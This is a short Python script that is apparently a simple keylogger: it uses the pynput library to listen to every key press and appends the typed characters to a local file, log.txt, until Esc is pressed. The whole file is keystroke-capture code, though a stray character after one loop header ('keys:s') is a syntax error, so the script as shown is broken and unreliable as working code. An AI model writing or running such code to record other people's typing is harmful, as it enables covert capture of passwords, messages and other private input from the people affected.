import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []
##file creation

    

def write_file(keys):
    flag = False
    try:
        file = open("log.txt","a")
    except IOError:
        print("NO file founnd!")
        file = open("log.txt","w")
        print("New file created!")

    for key in keys:s
        k = str(key).replace("'","")
        if k == "Key.space" and flag == False: 
            file.write('\n')
            flag = True

        elif k.find("Key") == -1:
            file.write(k)
            flag = False

    file.close()

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []
    #print("{0} pressed".format(key))

def on_release(key):
    if key == Key.esc:
        return False



with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()